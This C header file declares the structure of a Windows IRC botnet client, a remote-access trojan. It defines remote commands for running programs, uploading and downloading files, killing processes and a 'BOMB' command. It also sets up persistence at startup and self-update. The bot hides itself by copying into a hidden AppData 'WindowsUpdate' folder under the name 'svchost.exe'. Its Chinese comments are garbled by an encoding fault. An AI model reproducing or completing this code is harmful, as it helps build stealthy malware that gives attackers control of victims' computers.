
#ifndef HEADER
#define HEADER


#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>       // Socket connection
#include <windows.h>        // WinAPI calls
#include <ws2tcpip.h>       // TCP-IP Sockets
#include <stdio.h>
#include <string.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <malloc.h>
#include <time.h>
#include <stdarg.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")



// Constants
#define DEFAULT_BUFLEN 4096
#define MAX_SEND_LENGTH 400  // ����ͳ��ȣ��ӽ���������IRC���ƣ�
#define SEND_INTERVAL 1000    // ���ͼ�������룩
#define MAX_RECONNECT_ATTEMPTS 999
#define RECONNECT_INTERVAL 5000 // ��λ������
#define LONG_SLEEP_INTERVAL 1000*60*60*1 // 1Сʱ
#define MAX_PATH_LEN 512


// �����ļ���·��
#define HIDDEN_FOLDER L"\\WindowsUpdate"  // ֱ�ӷ��� AppData\\Local ��
#define TARGET_EXE_NAME L"svchost.exe"

#define UPDATE_FOLFER L"\\NewVersion"

#define DEBUG 0
#define HIDE_ON_ENTRY 1
//#define FILE_ATTR_HIDDEN


extern HANDLE hMutex;


typedef enum
{
    CMD_UNKNOWN,
    CMD_EXECUTE,
    CMD_GETHOSTNAME,
    CMD_GETUPTIME,
    CMD_SETSTARTUP,
    CMD_FILE_UPLOAD,
    CMD_FILE_DOWNLOAD,
    CMD_KILL_PROCESS,
    CMD_BOMB,
    CMD_LS,
    CMD_RUN,
    CMD_PWD,
    CMD_CD,
    CMD_CAT,
    CMD_UPDATE_EXE,
    CMD_GET_APPDATA_PATH
}CommandType;
typedef struct
{
    CommandType type;
    char* params[10]; // ���֧�� 10 ������
    int num_params;
} ParsedCommand;

// ��Ϣ�������ṹ
typedef struct {
    char buffer[DEFAULT_BUFLEN];  // ��Ϣ������
    size_t length;                // ��ǰ����������
    char target[128];             // Ŀ�������
    time_t lastSendTime;          // �ϴη���ʱ��
} MessageBuffer;


extern MessageBuffer msgBuffer;
extern SOCKET ircsock;

//file.c
int handle_file_upload(ParsedCommand cmd);
int handle_file_download(ParsedCommand cmd);
BYTE* base64_decode(const char* input, DWORD in_len, DWORD* out_len);


//function.cpp

int run_executable(const char* path, const char* args, int mode);
char* list_directory(const char* path);
char* pwd_command();
char* cd_command(const char* path);
char* cat_file(const char* path);

char* ExecuteCommand(const char* command);
void set_startup(const char* program_path, int enable);


//read_command.cpp
ParsedCommand parsecommand(char* raw_command);
char* execute_parsed_command(ParsedCommand cmd, SOCKET tcpsock);

//network.c
SOCKET TCPhandler(const char* server, const char* baseNick);


//message.c


void flushBuffer(MessageBuffer* mb, SOCKET sock);
void initMessageBuffer(MessageBuffer* mb, const char* target);
void appendToBuffer(MessageBuffer* mb, SOCKET sock, const char* message);

//persistence.c
void get_current_module_path(wchar_t* path, size_t len);
int copy_and_hide_bot();
int is_hidden_bot();
void get_appdata_path(wchar_t* path, size_t len);
int create_hidden_directory(const wchar_t* path);



//update_exe.c
int update_exe(char* path);

//hash.c
int compute_sha256(const BYTE* data, size_t len, char output[65]);


//log.c

extern char log_path[MAX_PATH_LEN];
extern char appdata_path[MAX_PATH_LEN];
void bot_log(const char* format, ...);
void init_log_path();

//unicode.c
int UnicodeToAnsi(const wchar_t* unicodeStr, char* ansiStr, int bufferSize);
int AnsiToUnicode(const char* ansiStr, wchar_t* unicodeStr, int bufferSize);
int Utf8ToAnsi(const char* utf8Str, char* ansiStr, int bufferSize);
int AnsiToUtf8(const char* ansiStr, char* utf8Str, int bufferSize);
  
#endif